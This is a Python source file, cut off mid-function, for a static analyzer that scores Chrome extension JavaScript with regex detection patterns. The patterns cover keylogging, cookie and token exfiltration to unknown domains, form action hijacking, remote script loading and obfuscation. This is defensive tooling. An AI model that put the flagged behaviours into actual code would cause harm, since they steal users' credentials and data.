#!/usr/bin/env python3
"""
JavaScript Code Analyzer
Advanced static analysis of JavaScript code using AST parsing and entropy calculation
"""

import re
import os
import math
import logging
from typing import Dict, Any, List, Optional
from collections import Counter
import base64

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

try:
    import esprima  # type: ignore
    ESPRIMA_AVAILABLE = True
except ImportError:
    ESPRIMA_AVAILABLE = False
    logger.warning("esprima not available. Install with: pip install esprima")


class JSCodeAnalyzer:
    """Advanced JavaScript code analyzer with AST parsing and entropy calculation (Google Standard)"""
    
    def __init__(self, risk_model_path: Optional[str] = None):
        """
        Initialize JS code analyzer with Google risk model
        
        Args:
            risk_model_path: Path to google_risk_model.json (default: same directory)
        """
        # Load Google risk model
        if risk_model_path is None:
            current_dir = os.path.dirname(os.path.abspath(__file__))
            risk_model_path = os.path.join(current_dir, 'google_risk_model.json')
        
        self.risk_model = self._load_risk_model(risk_model_path)
        
        # Load API abuse scores from JSON
        api_abuse_scores = self.risk_model.get('api_abuse', {})
        self.DANGEROUS_CHROME_APIS = {
            'chrome.debugger': api_abuse_scores.get('debugger', 100),
            'chrome.webRequestBlocking': api_abuse_scores.get('webRequestBlocking', 70),
            'chrome.proxy': api_abuse_scores.get('proxy', 70),
            'chrome.cookies': api_abuse_scores.get('cookies', 40),
            'chrome.webNavigation': api_abuse_scores.get('webNavigation', 30),
            'chrome.scripting.executeScript': api_abuse_scores.get('executeScript', 20)
        }
        
        # Load code pattern scores from JSON
        code_pattern_scores = self.risk_model.get('code_patterns', {})
        medium_score = code_pattern_scores.get('medium', 5)
        high_score = code_pattern_scores.get('high', 15)
        critical_score = code_pattern_scores.get('critical', 30)
        
        # Update pattern scores from JSON
        for pattern_name in self.MEDIUM_RISK_PATTERNS:
            self.MEDIUM_RISK_PATTERNS[pattern_name]['score'] = medium_score
        for pattern_name in self.HIGH_RISK_PATTERNS:
            self.HIGH_RISK_PATTERNS[pattern_name]['score'] = high_score
        for pattern_name in self.CRITICAL_RISK_PATTERNS:
            self.CRITICAL_RISK_PATTERNS[pattern_name]['score'] = critical_score
        
        # Load RCE/Exfiltration scores from JSON
        rce_scores = self.risk_model.get('rce_patterns', {})
        exfil_scores = self.risk_model.get('exfiltration_patterns', {})
        
        # Update RCE/Exfil pattern scores from JSON
        for pattern_name, pattern_def in self.RCE_EXFIL_PATTERNS.items():
            if pattern_def['category'] == 'RCE':
                # Match pattern name to JSON key
                if 'remote_script' in pattern_name or 'script' in pattern_name:
                    pattern_def['score'] = rce_scores.get('remote_script', 30)
                elif 'eval_fetch' in pattern_name or 'eval' in pattern_name:
                    pattern_def['score'] = rce_scores.get('eval_fetch', 40)
                elif 'external_import' in pattern_name or 'import' in pattern_name:
                    pattern_def['score'] = rce_scores.get('external_import', 40)
                elif 'proxy' in pattern_name:
                    pattern_def['score'] = rce_scores.get('proxy_modify', 30)
            elif pattern_def['category'] == 'EXFIL':
                if 'beacon' in pattern_name:
                    pattern_def['score'] = exfil_scores.get('beacon_unknown', 30)
                elif 'post' in pattern_name:
                    pattern_def['score'] = exfil_scores.get('post_unknown', 25)
                elif 'cookie' in pattern_name:
                    pattern_def['score'] = exfil_scores.get('cookie_remote', 40)
                elif 'token' in pattern_name:
                    pattern_def['score'] = exfil_scores.get('token_remote', 40)
                elif 'keylog' in pattern_name:
                    pattern_def['score'] = exfil_scores.get('keylog_remote', 50)
        
        # Load obfuscation scores from JSON
        obfuscation_scores = self.risk_model.get('obfuscation', {})
        # Obfuscation scores are applied in _analyze_obfuscation method
        
        # Compile all pattern groups
        self.compiled_medium_patterns = {
            name: re.compile(pattern['pattern'], re.IGNORECASE | re.MULTILINE)
            for name, pattern in self.MEDIUM_RISK_PATTERNS.items()
        }
        self.compiled_high_patterns = {
            name: re.compile(pattern['pattern'], re.IGNORECASE | re.MULTILINE)
            for name, pattern in self.HIGH_RISK_PATTERNS.items()
        }
        self.compiled_critical_patterns = {
            name: re.compile(pattern['pattern'], re.IGNORECASE | re.MULTILINE)
            for name, pattern in self.CRITICAL_RISK_PATTERNS.items()
        }
        self.compiled_rce_exfil_patterns = {
            name: re.compile(pattern['pattern'], re.IGNORECASE | re.MULTILINE)
            for name, pattern in self.RCE_EXFIL_PATTERNS.items()
        }
        # Legacy patterns for backward compatibility
        self.compiled_patterns = {
            name: re.compile(pattern['pattern'], re.IGNORECASE | re.MULTILINE)
            for name, pattern in self.DANGEROUS_PATTERNS.items()
        }
        self.compiled_iife_patterns = [re.compile(pattern, re.IGNORECASE | re.MULTILINE | re.DOTALL) 
                                       for pattern in self.IIFE_PATTERNS]
    
    def _load_risk_model(self, model_path: str) -> Dict[str, Any]:
        """Load Google risk model from JSON file"""
        try:
            if os.path.exists(model_path):
                import json
                with open(model_path, 'r', encoding='utf-8') as f:
                    model = json.load(f)
                    logger.info(f"Loaded Google risk model from {model_path}")
                    return model
            else:
                logger.warning(f"Risk model file not found: {model_path}, using defaults")
                return self._get_default_model()
        except Exception as e:
            logger.error(f"Error loading risk model: {e}, using defaults")
            return self._get_default_model()
    
    def _get_default_model(self) -> Dict[str, Any]:
        """Fallback default model if JSON cannot be loaded"""
        return {
            'code_patterns': {'medium': 5, 'high': 15, 'critical': 30},
            'rce_patterns': {
                'remote_script': 30,
                'eval_fetch': 40,
                'external_import': 40,
                'proxy_modify': 30
            },
            'exfiltration_patterns': {
                'beacon_unknown': 30,
                'post_unknown': 25,
                'cookie_remote': 40,
                'token_remote': 40,
                'keylog_remote': 50
            },
            'obfuscation': {
                'base64_large': 20,
                'hex': 25,
                'unicode': 25,
                '_0x': 30,
                'multi_layer': 40
            },
            'api_abuse': {
                'debugger': 100,
                'webRequestBlocking': 70,
                'proxy': 70,
                'cookies': 40,
                'webNavigation': 30,
                'executeScript': 20
            }
        }
    
    # Code Patterns Scoring (Google Standard - Max 100 points)
    # Medium-risk patterns: 5 points each
    # High-risk patterns: 15 points each  
    # Critical-risk patterns: 30 points each
    
    # REMOVED false positives (common in legitimate extensions):
    # - innerHTML (many UI extensions use this)
    # - templates (UI extensions use <template> frequently)
    # - localStorage.getItem (very common)
    # - chrome.storage.sync (safe API)
    # - MutationObserver (common for DOM monitoring)
    
    # Medium-risk patterns (5 points each) - Google Standard
    MEDIUM_RISK_PATTERNS = {
        'dom_rewrite': {
            'pattern': r'(document\.write|document\.body\.innerHTML|document\.documentElement\.innerHTML)',
            'severity': 'MEDIUM',
            'score': 5,
            'description': 'DOM rewrite'
        },
        'form_field_monitoring': {
            'pattern': r'(document\.forms|querySelector.*input|getElementsByTagName.*input)',
            'severity': 'MEDIUM',
            'score': 5,
            'description': 'Form field monitoring'
        }
    }
    
    # High-risk patterns (15 points each) - Google Standard
    HIGH_RISK_PATTERNS = {
        'keydown_keypress_interception': {
            'pattern': r'addEventListener\s*\(\s*["\'](keydown|keypress)["\']',
            'severity': 'HIGH',
            'score': 15,
            'description': 'keydown / keypress interception'
        },
        'reading_auth_headers': {
            'pattern': r'(Authorization|Bearer)\s*[:=]\s*["\']',
            'severity': 'HIGH',
            'score': 15,
            'description': 'reading auth headers'
        },
        'listening_onBeforeRequest': {
            'pattern': r'chrome\.webRequest\.onBeforeRequest',
            'severity': 'HIGH',
            'score': 15,
            'description': 'listening to onBeforeRequest'
        },
        'scanning_credentials': {
            'pattern': r'(password|pwd|passwd|credential|token).*?\.(value|text|innerHTML)',
            'severity': 'HIGH',
            'score': 15,
            'description': 'scanning page text for credentials'
        },
        'modifying_input_fields': {
            'pattern': r'\.value\s*=\s*[^;]+|input\[.*?\]\.value\s*=',
            'severity': 'HIGH',
            'score': 15,
            'description': 'modifying input fields'
        }
    }
    
    # Critical-risk patterns (30 points each) - Google Standard
    CRITICAL_RISK_PATTERNS = {
        'form_action_hijacking': {
            'pattern': r'\.(attr|setAttribute)\s*\(\s*["\']action["\']\s*,\s*["\'](https?://|//)',
            'severity': 'CRITICAL',
            'score': 30,
            'description': 'Form action hijacking - redirecting form data to malicious server'
        },
        'form_action_manipulation': {
            'pattern': r'(form|\._9vtf|\._4-u8|\._2-pbz|querySelector.*form).*\.(action|attr\s*\(\s*["\']action["\'])\s*=',
            'severity': 'CRITICAL',
            'score': 30,
            'description': 'Form action manipulation detected'
        },
        'eval': {
            'pattern': r'eval\s*\(',
            'severity': 'CRITICAL',
            'score': 30,
            'description': 'eval'
        },
        'function_constructor': {
            'pattern': r'new\s+Function\s*\(',
            'severity': 'CRITICAL',
            'score': 30,
            'description': 'new Function'
        },
        'dynamic_import': {
            'pattern': r'import\s*\(\s*["\']https?://',
            'severity': 'CRITICAL',
            'score': 30,
            'description': 'dynamic import'
        },
        'dynamic_script_injection': {
            'pattern': r'\.appendChild\s*\([^)]*createElement\s*\(\s*["\']script["\']',
            'severity': 'CRITICAL',
            'score': 30,
            'description': 'dynamic script injection (appendChild(script))'
        },
        'injecting_js_into_dom': {
            'pattern': r'(script|iframe)\.src\s*=\s*["\']|document\.write\s*\(\s*["\']<script',
            'severity': 'CRITICAL',
            'score': 30,
            'description': 'injecting JS into DOM'
        },
        'modifying_csp_security_headers': {
            'pattern': r'(Content-Security-Policy|X-Frame-Options|X-Content-Type-Options).*?=',
            'severity': 'CRITICAL',
            'score': 30,
            'description': 'modifying CSP or security headers'
        }
    }
    
    # RCE / Data Exfiltration Indicators (Google Standard - Max 100 points)
    RCE_EXFIL_PATTERNS = {
        # RCE Indicators (Google Standard)
        'loading_remote_script': {
            'pattern': r'(script|link)\.src\s*=\s*["\']https?://',
            'severity': 'HIGH',
            'score': 30,
            'description': 'loading remote script from internet',
            'category': 'RCE'
        },
        'eval_fetch': {
            'pattern': r'eval\s*\([^)]*fetch\s*\(|eval\s*\([^)]*XMLHttpRequest',
            'severity': 'CRITICAL',
            'score': 40,
            'description': 'eval(fetch())',
            'category': 'RCE'
        },
        'external_import': {
            'pattern': r'import\s*\(\s*["\']https?://',
            'severity': 'CRITICAL',
            'score': 40,
            'description': 'external import()',
            'category': 'RCE'
        },
        'using_proxy_api': {
            'pattern': r'chrome\.proxy\s*\.|chrome\.proxy\.settings',
            'severity': 'HIGH',
            'score': 30,
            'description': 'using proxy API to modify traffic',
            'category': 'RCE'
        },
        # Data Exfiltration Indicators (Google Standard)
        'beacon_unknown': {
            'pattern': r'navigator\.sendBeacon\s*\(\s*["\']https?://(?!.*(google\.com|github\.com|microsoft\.com|mozilla\.org|example\.com|localhost))',
            'severity': 'HIGH',
            'score': 30,
            'description': 'sendBeacon → unknown domain',
            'category': 'EXFIL'
        },
        'post_unknown': {
            'pattern': r'fetch\s*\([^)]*method\s*:\s*["\']POST["\'][^)]*https?://(?!.*(google\.com|github\.com|microsoft\.com|mozilla\.org|example\.com|localhost))',
            'severity': 'HIGH',
            'score': 25,
            'description': 'fetch POST → unknown domain',
            'category': 'EXFIL'
        },
        'cookie_remote': {
            'pattern': r'document\.cookie.*?fetch.*?https?://(?!.*(google\.com|github\.com|microsoft\.com|mozilla\.org|example\.com|localhost))|document\.cookie.*?XMLHttpRequest.*?https?://(?!.*(google\.com|github\.com|microsoft\.com|mozilla\.org|example\.com|localhost))',
            'severity': 'CRITICAL',
            'score': 40,
            'description': 'cookie → remote',
            'category': 'EXFIL'
        },
        'token_remote': {
            'pattern': r'(localStorage\.getItem|sessionStorage\.getItem|Authorization|Bearer).*?fetch.*?https?://(?!.*(google\.com|github\.com|microsoft\.com|mozilla\.org|example\.com|localhost))',
            'severity': 'CRITICAL',
            'score': 40,
            'description': 'token → remote',
            'category': 'EXFIL'
        },
        'keylog_remote': {
            'pattern': r'addEventListener\s*\(\s*["\'](keydown|keypress|input)["\'][^}]*fetch.*?https?://(?!.*(google\.com|github\.com|microsoft\.com|mozilla\.org|example\.com|localhost))',
            'severity': 'CRITICAL',
            'score': 50,
            'description': 'keylog → remote',
            'category': 'EXFIL'
        }
    }
    
    # Legacy patterns (for backward compatibility)
    DANGEROUS_PATTERNS = {
        'eval': {
            'pattern': r'eval\s*\(',
            'severity': 'HIGH',
            'score': 20,
            'description': 'Use of eval() function'
        },
        'function_constructor': {
            'pattern': r'new\s+Function\s*\(',
            'severity': 'HIGH',
            'score': 20,
            'description': 'Use of Function constructor'
        },
        'atob_decode': {
            'pattern': r'atob\s*\(',
            'severity': 'MEDIUM',
            'score': 10,
            'description': 'Base64 decoding (potential obfuscation)'
        },
        'btoa_encode': {
            'pattern': r'btoa\s*\(',
            'severity': 'LOW',
            'score': 5,
            'description': 'Base64 encoding'
        },
        'settimeout_string': {
            'pattern': r'setTimeout\s*\(\s*["\']',
            'severity': 'MEDIUM',
            'score': 15,
            'description': 'setTimeout with string code'
        },
        'setinterval_string': {
            'pattern': r'setInterval\s*\(\s*["\']',
            'severity': 'MEDIUM',
            'score': 15,
            'description': 'setInterval with string code'
        },
        'document_write': {
            'pattern': r'document\.write\s*\(',
            'severity': 'MEDIUM',
            'score': 10,
            'description': 'Use of document.write()'
        },
        'innerhtml_injection': {
            'pattern': r'\.innerHTML\s*=',
            'severity': 'MEDIUM',
            'score': 10,
            'description': 'Direct innerHTML assignment'
        },
        'outerhtml_injection': {
            'pattern': r'\.outerHTML\s*=',
            'severity': 'HIGH',
            'score': 15,
            'description': 'Direct outerHTML assignment'
        },
        'createelement_script': {
            'pattern': r'createElement\s*\(\s*["\']script["\']',
            'severity': 'HIGH',
            'score': 20,
            'description': 'Dynamic script creation'
        },
        'xhr_send': {
            'pattern': r'\.send\s*\(',
            'severity': 'MEDIUM',
            'score': 10,
            'description': 'XHR send (potential exfiltration)'
        },
        'fetch_call': {
            'pattern': r'fetch\s*\(',
            'severity': 'MEDIUM',
            'score': 10,
            'description': 'Fetch API call'
        },
        'dynamic_import': {
            'pattern': r'import\s*\(\s*["\']https?://',
            'severity': 'CRITICAL',
            'score': 30,
            'description': 'Dynamic import from remote URL (remote code loading)'
        },
        'script_src_remote': {
            'pattern': r'\.src\s*=\s*["\']https?://',
            'severity': 'HIGH',
            'score': 25,
            'description': 'Script src assignment to remote URL (remote code loading)'
        },
        'sendbeacon': {
            'pattern': r'navigator\.sendBeacon\s*\(',
            'severity': 'HIGH',
            'score': 20,
            'description': 'navigator.sendBeacon() call (data exfiltration)'
        },
        'document_cookie': {
            'pattern': r'document\.cookie\s*=',
            'severity': 'MEDIUM',
            'score': 15,
            'description': 'Direct document.cookie assignment'
        },
        'localstorage_getitem': {
            'pattern': r'localStorage\.getItem\s*\(',
            'severity': 'MEDIUM',
            'score': 12,
            'description': 'localStorage.getItem() call (potential token theft)'
        },
        'sessionstorage_getitem': {
            'pattern': r'sessionStorage\.getItem\s*\(',
            'severity': 'MEDIUM',
            'score': 12,
            'description': 'sessionStorage.getItem() call (potential token theft)'
        },
        'appendchild': {
            'pattern': r'\.appendChild\s*\(',
            'severity': 'MEDIUM',
            'score': 12,
            'description': 'appendChild() call (potential script injection)'
        },
        'insertadjacenthtml': {
            'pattern': r'\.insertAdjacentHTML\s*\(',
            'severity': 'HIGH',
            'score': 18,
            'description': 'insertAdjacentHTML() call (potential script injection)'
        },
        'addeventlistener_keydown': {
            'pattern': r'addEventListener\s*\(\s*["\']keydown["\']',
            'severity': 'HIGH',
            'score': 20,
            'description': 'addEventListener("keydown") - potential keylogging'
        },
        'addeventlistener_input': {
            'pattern': r'addEventListener\s*\(\s*["\']input["\']',
            'severity': 'HIGH',
            'score': 20,
            'description': 'addEventListener("input") - potential keylogging'
        },
        'addeventlistener_keypress': {
            'pattern': r'addEventListener\s*\(\s*["\']keypress["\']',
            'severity': 'HIGH',
            'score': 20,
            'description': 'addEventListener("keypress") - potential keylogging'
        },
        'input_value_access': {
            'pattern': r'input\[["\']value["\']\]|\.value\s*=',
            'severity': 'MEDIUM',
            'score': 10,
            'description': 'Input value access/assignment (potential keylogging)'
        },
        'location_href_redirect': {
            'pattern': r'location\.href\s*=\s*["\']https?://',
            'severity': 'HIGH',
            'score': 22,
            'description': 'location.href redirect to remote URL (hijacking)'
        },
        'location_replace': {
            'pattern': r'location\.replace\s*\(',
            'severity': 'MEDIUM',
            'score': 15,
            'description': 'location.replace() call (potential redirect)'
        },
        'location_assign': {
            'pattern': r'location\.assign\s*\(',
            'severity': 'MEDIUM',
            'score': 15,
            'description': 'location.assign() call (potential redirect)'
        },
        # Remote Code Execution patterns (Chrome Web Store critical violations)
        'import_remote': {
            'pattern': r'import\s*\(\s*["\']https?://',
            'severity': 'CRITICAL',
            'score': 35,
            'description': 'Dynamic import from remote URL (remote code execution)'
        },
        'script_src_dynamic': {
            'pattern': r'(script|link)\.src\s*=\s*["\']https?://',
            'severity': 'CRITICAL',
            'score': 35,
            'description': 'Dynamic script/link src from remote URL (remote code execution)'
        },
        'createelement_script_remote': {
            'pattern': r'createElement\s*\(\s*["\']script["\']\s*\).*?\.src\s*=\s*["\']https?://',
            'severity': 'CRITICAL',
            'score': 40,
            'description': 'Dynamic script creation with remote src (remote code execution)'
        },
        'settimeout_eval': {
            'pattern': r'setTimeout\s*\(\s*(eval|Function|atob)',
            'severity': 'HIGH',
            'score': 25,
            'description': 'setTimeout with eval/Function (code injection)'
        },
        'setinterval_eval': {
            'pattern': r'setInterval\s*\(\s*(eval|Function|atob)',
            'severity': 'HIGH',
            'score': 25,
            'description': 'setInterval with eval/Function (code injection)'
        },
        'postmessage_unsafe': {
            'pattern': r'postMessage\s*\([^,]+,\s*["\']\*["\']',
            'severity': 'HIGH',
            'score': 20,
            'description': 'postMessage with wildcard origin (XSS risk)'
        },
        'chrome_runtime_geturl': {
            'pattern': r'chrome\.runtime\.getURL\s*\(',
            'severity': 'MEDIUM',
            'score': 10,
            'description': 'chrome.runtime.getURL() - potential remote resource loading'
        }
    }
    
    # IIFE patterns (Immediately Invoked Function Expression)
    IIFE_PATTERNS = [
        r'\(function\s*\([^)]*\)\s*\{[^}]*\}\s*\)\s*\([^)]*\)',
        r'\(function\s*\([^)]*\)\s*\{[^}]*\}\s*\([^)]*\)\)',
        r'!function\s*\([^)]*\)\s*\{[^}]*\}\s*\([^)]*\)',
        r'\+function\s*\([^)]*\)\s*\{[^}]*\}\s*\([^)]*\)',
        r'-function\s*\([^)]*\)\s*\{[^}]*\}\s*\([^)]*\)'
    ]
    
    
    def analyze_code(self, code: str, file_path: Optional[str] = None) -> Dict[str, Any]:
        """
        Analyze JavaScript code for security risks
        
        Args:
            code: JavaScript code string
            file_path: Optional file path for context
            
        Returns:
            Analysis results dictionary
        """
        if not code:
            return {'error': 'No code provided'}
        
        results = {
            'file_path': file_path,
            'file_size': len(code),
            'risk_score': 0,
            'flags': [],
            'pattern_detection': self._detect_patterns(code),
            'chrome_api_detection': self._detect_chrome_apis(code),
            'obfuscation_analysis': self._analyze_obfuscation(code),
            'atob_analysis': self._analyze_atob_decoding(code),
            'iife_detection': self._detect_iife(code),
            'domain_analysis': self._analyze_domains(code),
            'entropy_analysis': self._calculate_entropy(code),
            'keylogging_analysis': self._analyze_keylogging(code),
            'redirect_analysis': self._analyze_redirect_hijacking(code),
            'storage_analysis': self._analyze_storage_access(code),
            'remote_code_execution': self._analyze_remote_code_execution(code),
            'network_activity': self._analyze_network_activity(code),
            'wasm_detection': self._detect_wasm(code),
            'risk_level': 'LOW'
        }
        
        # Merge redirect_analysis score into pattern_detection['rce_exfil_score']
        # This ensures redirect hijacking is included in hybrid analysis scoring
        redirect_score = results.get('redirect_analysis', {}).get('risk_score', 0)
        if redirect_score > 0:
            # Form hijacking is CRITICAL - set both scores to 100 to ensure CRITICAL rating
            # This ensures form hijacking always results in CRITICAL (70+) final score
            results['pattern_detection']['rce_exfil_score'] = 100  # CRITICAL = 100 points
            results['pattern_detection']['code_patterns_score'] = 100  # CRITICAL code pattern
            # Add flags from redirect_analysis to pattern_detection
            redirect_flags = results.get('redirect_analysis', {}).get('flags', [])
            if redirect_flags:
                results['pattern_detection']['flags'].extend(redirect_flags)
        
        # Calculate overall risk score
        results['risk_score'] = self._calculate_code_risk_score(results)
        results['risk_level'] = self._get_risk_level(results['risk_score'])
        
        return results
    
    def analyze_file(self, file_path: str) -> Dict[str, Any]:
        """Analyze JavaScript file"""
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                code = f.read()
            return self.analyze_code(code, file_path)
        except Exception as e:
            logger.error(f"Error reading file {file_path}: {e}")
            return {'error': f'Failed to read file: {e}'}
    
    def _detect_patterns(self, code: str) -> Dict[str, Any]:
        """
        Detect dangerous JavaScript patterns (Google Standard)
        Returns separate scores for:
        - Code Patterns: 0-100 points (Medium 5, High 15, Critical 30)
        - RCE/Exfiltration: 0-100 points
        """
        detection = {
            'patterns_found': [],
            'pattern_counts': {},
            'total_patterns': 0,
            'code_patterns_score': 0,  # 0-100 points (Google Standard)
            'rce_exfil_score': 0,     # 0-100 points (Google Standard)
            'risk_score': 0,           # Legacy total
            'flags': []
        }
        
        # Google Standard: Chỉ tính mỗi loại pattern 1 lần, không nhân theo số lần xuất hiện
        # Detect Medium-risk patterns (5 points each - Google Standard)
        for pattern_name, pattern_def in self.MEDIUM_RISK_PATTERNS.items():
            compiled = self.compiled_medium_patterns.get(pattern_name)
            if compiled:
                matches = compiled.findall(code)
                if matches:
                    count = len(matches)
                    detection['pattern_counts'][pattern_name] = count
                    detection['patterns_found'].append({
                        'name': pattern_name,
                        'count': count,
                        'severity': 'MEDIUM',
                        'score': pattern_def['score'],
                        'description': pattern_def['description'],
                        'category': 'CODE_PATTERN'
                    })
                    detection['total_patterns'] += count
                    # Google Standard: Chỉ tính mỗi loại 1 lần, không nhân theo count
                    detection['code_patterns_score'] += pattern_def['score']  # 5 points per pattern type (once)
        
        # Detect High-risk patterns (15 points each - Google Standard)
        for pattern_name, pattern_def in self.HIGH_RISK_PATTERNS.items():
            compiled = self.compiled_high_patterns.get(pattern_name)
            if compiled:
                matches = compiled.findall(code)
                if matches:
                    count = len(matches)
                    detection['pattern_counts'][pattern_name] = count
                    detection['patterns_found'].append({
                        'name': pattern_name,
                        'count': count,
                        'severity': 'HIGH',
                        'score': pattern_def['score'],
                        'description': pattern_def['description'],
                        'category': 'CODE_PATTERN'
                    })
                    detection['total_patterns'] += count
                    # Google Standard: Chỉ tính mỗi loại 1 lần, không nhân theo count
                    detection['code_patterns_score'] += pattern_def['score']  # 15 points per pattern type (once)
        
        # Detect Critical-risk patterns (30 points each - Google Standard)
        for pattern_name, pattern_def in self.CRITICAL_RISK_PATTERNS.items():
            compiled = self.compiled_critical_patterns.get(pattern_name)
            if compiled:
                matches = compiled.findall(code)
                if matches:
                    count = len(matches)
                    detection['pattern_counts'][pattern_name] = count
                    detection['patterns_found'].append({
                        'name': pattern_name,
                        'count': count,
                        'severity': 'CRITICAL',
                        'score': pattern_def['score'],
                        'description': pattern_def['description'],
                        'category': 'CODE_PATTERN'
                    })
                    detection['total_patterns'] += count
                    # Google Standard: Chỉ tính mỗi loại 1 lần, không nhân theo count
                    detection['code_patterns_score'] += pattern_def['score']  # 30 points per pattern type (once)
        
        # Detect RCE/Exfiltration patterns (Google Standard)
        # Google chỉ tính highest per category, không cộng dồn
        rce_scores = []  # Track RCE scores separately
        exfil_scores = []  # Track Exfil scores separately
        
        for pattern_name, pattern_def in self.RCE_EXFIL_PATTERNS.items():
            compiled = self.compiled_rce_exfil_patterns.get(pattern_name)
            if compiled:
                matches = compiled.findall(code)
                if matches:
                    count = len(matches)
                    detection['pattern_counts'][pattern_name] = count
                    detection['patterns_found'].append({
                        'name': pattern_name,
                        'count': count,
                        'severity': pattern_def['severity'],
                        'score': pattern_def['score'],
                        'description': pattern_def['description'],
                        'category': pattern_def['category']
                    })
                    detection['total_patterns'] += count
                    # Google Standard: Chỉ tính highest per category
                    if pattern_def['category'] == 'RCE':
                        rce_scores.append(pattern_def['score'])
                    elif pattern_def['category'] == 'EXFIL':
                        exfil_scores.append(pattern_def['score'])
        
        # Google Standard: RCE/Exfil score = max(RCE, Exfil)
        # RCE score = max(all RCE patterns)
        # Exfil score = max(all Exfil patterns)
        # Final = max(RCE score, Exfil score)
        rce_max = max(rce_scores) if rce_scores else 0
        exfil_max = max(exfil_scores) if exfil_scores else 0
        detection['rce_exfil_score'] = max(rce_max, exfil_max)
        
        # NOTE: redirect_analysis score will be added in _calculate_code_risk_score()
        # and also needs to be merged into rce_exfil_score here for hybrid analysis
        
        # Cap scores at their maximums (Google Standard: max 100 each)
        detection['code_patterns_score'] = min(detection['code_patterns_score'], 100)
        detection['rce_exfil_score'] = min(detection['rce_exfil_score'], 100)
        
        # Legacy total score (for backward compatibility)
        detection['risk_score'] = detection['code_patterns_score'] + detection['rce_exfil_score']
        
        return detection
    
    def _detect_chrome_apis(self, code: str) -> Dict[str, Any]:
        """
        Detect usage of dangerous Chrome APIs (Google Standard)
        Returns risk score 0-100 points (capped) for Chrome API Abuse Risk component
        
        Google Standard: Chỉ lấy API nguy hiểm nhất (max), không cộng dồn
        Only 3 APIs are truly dangerous: debugger (100), webRequestBlocking (70), proxy (70)
        """
        detection = {
            'apis_found': [],
            'api_counts': {},
            'total_apis': 0,
            'risk_score': 0  # 0-100 points max
        }
        
        api_scores_found = []  # Track all API scores found
        
        for api, score in self.DANGEROUS_CHROME_APIS.items():
            # Escape dots for regex
            api_pattern = api.replace('.', r'\.')
            pattern = re.compile(api_pattern, re.IGNORECASE)
            matches = pattern.findall(code)
            
            if matches:
                count = len(matches)
                detection['api_counts'][api] = count
                detection['apis_found'].append({
                    'api': api,
                    'count': count,
                    'score': score,
                    'severity': 'CRITICAL' if score >= 70 else 'HIGH'
                })
                detection['total_apis'] += count
                # Track score for max calculation
                api_scores_found.append(score)
        
        # Google Standard: Chỉ lấy API nguy hiểm nhất (max), không cộng dồn
        if api_scores_found:
            detection['risk_score'] = max(api_scores_found)
        else:
            detection['risk_score'] = 0
        
        # Cap Chrome API Abuse Risk at 100 points (Google standard)
        detection['risk_score'] = min(detection['risk_score'], 100)
        
        return detection
    
    def _analyze_obfuscation(self, code: str) -> Dict[str, Any]:
        """
        Analyze code for obfuscation indicators (Google Standard - from JSON model)
        Returns score 0-100 points (max)
        
        Google Standard: Chỉ lấy mức nghiêm trọng nhất (max), không cộng dồn
        """
        obfuscation_scores = self.risk_model.get('obfuscation', {})
        
        analysis = {
            'entropy': self._calculate_entropy(code)['shannon_entropy'],
            'file_size': len(code),
            'is_likely_obfuscated': False,
            'indicators': [],
            'risk_score': 0
        }
        
        indicator_scores = []  # Track all indicator scores
        
        # Check for base64 >= 300 chars (Google Standard: 300, not 500)
        base64_pattern = r'["\'][A-Za-z0-9+/]{300,}={0,2}["\']'
        base64_matches = re.findall(base64_pattern, code)
        if base64_matches:
            analysis['indicators'].append('BASE64_LARGE')
            indicator_scores.append(obfuscation_scores.get('base64_large', 20))
            analysis['is_likely_obfuscated'] = True
        
        # Check for high entropy (> 4.0) - Google Standard
        entropy = analysis['entropy']
        if entropy > 4.0:
            analysis['indicators'].append('HIGH_ENTROPY')
            # High entropy contributes to obfuscation score (use max of existing indicators)
            # Don't add separate score, but mark as obfuscated
            analysis['is_likely_obfuscated'] = True
        
        # Check for hex-obfuscation (from JSON)
        hex_pattern = r'0x[0-9a-fA-F]{8,}'
        hex_strings = len(re.findall(hex_pattern, code))
        if hex_strings > 20:
            analysis['indicators'].append('HEX_OBFUSCATION')
            indicator_scores.append(obfuscation_scores.get('hex', 25))
            analysis['is_likely_obfuscated'] = True
        
        # Check for unicode escapes (from JSON)
        unicode_pattern = r'\\u[0-9a-fA-F]{4}'
        unicode_escapes = len(re.findall(unicode_pattern, code))
        if unicode_escapes > 50:
            analysis['indicators'].append('UNICODE_ESCAPES')
            indicator_scores.append(obfuscation_scores.get('unicode', 25))
            analysis['is_likely_obfuscated'] = True
        
        # Check for _0x prefix (packer) (from JSON)
        _0x_pattern = r'_0x[a-f0-9]+'
        _0x_vars = re.findall(_0x_pattern, code, re.IGNORECASE)
        if len(_0x_vars) >= 2:
            analysis['indicators'].append('_0X_PREFIX_PACKER')
            indicator_scores.append(obfuscation_scores.get('_0x', 30))
            analysis['is_likely_obfuscated'] = True
        
        # Check for multi-layer deobfuscation (from JSON)
        nested_atob_pattern = r'atob\s*\(\s*atob\s*\('
        if re.search(nested_atob_pattern, code, re.IGNORECASE):
            analysis['indicators'].append('MULTI_LAYER_DEOBFUSCATION')
            indicator_scores.append(obfuscation_scores.get('multi_layer', 40))
            analysis['is_likely_obfuscated'] = True
        
        # Google Standard: Chỉ lấy mức nghiêm trọng nhất (max), không cộng dồn
        if indicator_scores:
            analysis['risk_score'] = max(indicator_scores)
        else:
            analysis['risk_score'] = 0
        
        # Cap at 100 points (Google standard)
        analysis['risk_score'] = min(analysis['risk_score'], 100)
        
        return analysis
    
    def _analyze_atob_decoding(self, code: str) -> Dict[str, Any]:
        """Analyze atob() usage for multi-layer decoding"""
        analysis = {
            'atob_calls': [],
            'nested_decoding': False,
            'risk_score': 0
        }
        
        # Find all atob calls
        atob_pattern = r'atob\s*\(\s*([^)]+)\)'
        atob_matches = re.finditer(atob_pattern, code, re.IGNORECASE)
        
        for match in atob_matches:
            arg = match.group(1).strip()
            analysis['atob_calls'].append({
                'full_match': match.group(0),
                'argument': arg,
                'position': match.start()
            })
            
            # Check for nested atob (atob(atob(...)))
            nested_pattern = r'atob\s*\(\s*atob\s*\('
            if re.search(nested_pattern, code[match.start():match.end() + 100], re.IGNORECASE):
                analysis['nested_decoding'] = True
                analysis['risk_score'] += 20
                analysis['flags'] = [{
                    'type': 'NESTED_ATOB',
                    'severity': 'HIGH',
                    'description': 'Nested atob() calls detected - likely multi-layer obfuscation'
                }]
        
        # Count total atob calls
        if len(analysis['atob_calls']) > 3:
            analysis['risk_score'] += 15
            analysis['flags'] = analysis.get('flags', [])
            analysis['flags'].append({
